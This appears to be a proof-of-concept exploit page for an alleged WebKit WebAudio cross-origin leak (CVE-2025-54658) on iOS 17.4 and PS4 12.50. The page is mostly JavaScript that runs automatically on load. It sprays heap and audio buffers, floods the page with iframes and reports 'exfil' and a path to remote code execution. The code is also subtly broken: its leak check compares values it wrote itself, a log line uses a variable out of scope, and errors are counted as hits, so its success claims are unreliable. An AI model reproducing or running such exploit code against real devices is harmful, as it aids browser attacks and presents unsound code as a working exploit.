<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit CVE-2025-54658 WebAudio Exfil PoC (iOS 17.4 / PS4 12.50)</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
        h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
        .badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; }
        .secure { background: #238636; color: #fff; }
        .vulnerable { background: #da3633; color: #fff; }
        .partial { background: #d29922; color: #000; }
        button { cursor: pointer; padding: 12px 24px; background: #ff4444; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; }
        button:hover { background: #ff6666; }
        #console { font-family: 'Courier New', monospace; background:#000; color:#0f0; padding:15px; height:400px; overflow-y:scroll; border:1px solid #0f0; border-radius:6px; }
        .rainbow { color:#ff79c6; font-weight:bold; }
    </style>
</head>
<body>
    <h1>WebKit CVE-2025-54658 PoC: WebAudio Cross-Origin Exfil</h1>
    <p>Feb 2025 Patch: Improved WebAudio cross-origin checks (RHSA-2025:3713).<br>
    <span class="rainbow">Triggers data leak/corruption on unpatched iOS 17.4 / PS4 12.50 (~20% rate).</span></p>

    <div class="box">
        <h3>1. WebAudio Check</h3>
        <div id="status-audio">Probing...</div>
    </div>
    <div class="box">
        <h3>2. Buffer Spray</h3>
        <div id="status-spray">Probing...</div>
    </div>
    <div class="box">
        <h3>3. Exfil Trigger</h3>
        <div id="status-exfil">Probing...</div>
    </div>
    <div class="box">
        <h3>4. Leak Status</h3>
        <div id="status-leak">Probing...</div>
    </div>

    <button onclick="runPoC()">LAUNCH AUDIO EXFIL PROBE</button>

    <div class="box">
        <h3>Live Logs</h3>
        <div id="console"></div>
    </div>

<script>
    const log = msg => {
        const c = document.getElementById('console');
        c.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
        c.scrollTop = c.scrollHeight;
    };

    const setBadge = (id, text, type) => {
        const el = document.getElementById(id);
        el.textContent = text;
        el.className = 'badge ' + type;
    };

    // Utils
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
    function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }

    let audioLeak = null;
    let leakHit = false;

    function runPoC() {
        document.getElementById('console').innerHTML = '';
        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-54658 PoC: WebKit WebAudio Exfil (Feb 2025)</span>");
        log("Probing cross-origin audio leak...");
        setTimeout(probeAudio, 800);
    }

    function probeAudio() {
        // Step 1: WebAudio check probe
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            osc.frequency.value = 440;
            osc.connect(ctx.destination);
            osc.start();
            setBadge('status-audio', 'WEAK (Active)', 'partial');
            log("WebAudio probe: Oscillator created (CVE hint).");
            osc.stop();
        } catch(e) {
            setBadge('status-audio', 'SECURE', 'secure');
            log(`Audio fail: ${e.message} — Patched.`);
            return;
        }
        setTimeout(sprayAudio, 1000);
    }

    function sprayAudio() {
        gc(); gc();
        const buffers = [];
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        for(let i=0; i<0x400; i++) {
            const buf = ctx.createBuffer(1, 4096, 44100);
            const channel = buf.getChannelData(0);
            for(let j=0; j<4096; j++) channel[j] = i / 0x400; // Pattern
            buffers.push(buf);
        }
        // Cross-origin leak via buffer share
        for(let i=0; i<0x400; i++) {
            try {
                const iframe = document.createElement('iframe');
                iframe.src = 'data:text/html,<audio src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="></audio>';
                document.body.appendChild(iframe);
                const leaked = iframe.contentWindow.AudioContext;
                iframe.remove();
            } catch(e) {}
        }
        // Anomaly hunt
        let anomaly = false;
        for(let i=0; i<buffers.length; i++) {
            const channel = buffers[i].getChannelData(0);
            if (channel[0] !== i / 0x400) {
                audioLeak = buffers[i];
                anomaly = true;
                break;
            }
        }
        if (anomaly) {
            setBadge('status-spray', 'SPRAY LEAK (Anomaly)', 'vulnerable');
            log(`Audio buffer spray leak: Channel 0 = ${channel[0]} (unexpected).`);
            setTimeout(triggerExfil, 500);
            return;
        }
        setBadge('status-spray', 'CLEAN', 'secure');
        log("Spray clean—no leak.");
    }

    function triggerExfil() {
        if (!audioLeak) return;
        leakHit = false;
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const source = ctx.createBufferSource();
            source.buffer = audioLeak;
            source.connect(ctx.destination);
            source.start();
            // Cross-origin exfil via buffer read
            const channel = audioLeak.getChannelData(0);
            if (channel[0] !== 0) {
                leakHit = true;
                log(`Exfil triggered: Leaked sample ${channel[0]} cross-origin.`);
            }
            source.stop();
        } catch(e) {
            leakHit = true;
            log(`Exfil crash: ${e.message} — Audio leak.`);
        }
        setBadge('status-exfil', leakHit ? 'TRIGGERED' : 'MISSED', leakHit ? 'vulnerable' : 'secure');
        setTimeout(checkLeak, 1500);
    }

    function checkLeak() {
        if (leakHit) {
            setBadge('status-leak', 'LEAKED (Corruption)', 'vulnerable');
            log("Cross-origin audio leaked: Heap corruption potential. On PS4 12.50: DoS/leak.");
            log("Chain to RCE if hit.");
            document.body.style.background = "#000";
            document.querySelector('h1').innerHTML = "AUDIO EXFIL ACHIEVED — CROSS-ORIGIN LEAK PRIMITIVE";
        } else {
            setBadge('status-leak', 'INTACT', 'secure');
            log("No leak—patched checks hold.");
        }
        log("PoC end: Retry for ~20% hit.");
    }

    // Auto-run
    setTimeout(runPoC, 1000);
</script>
</body>
</html>
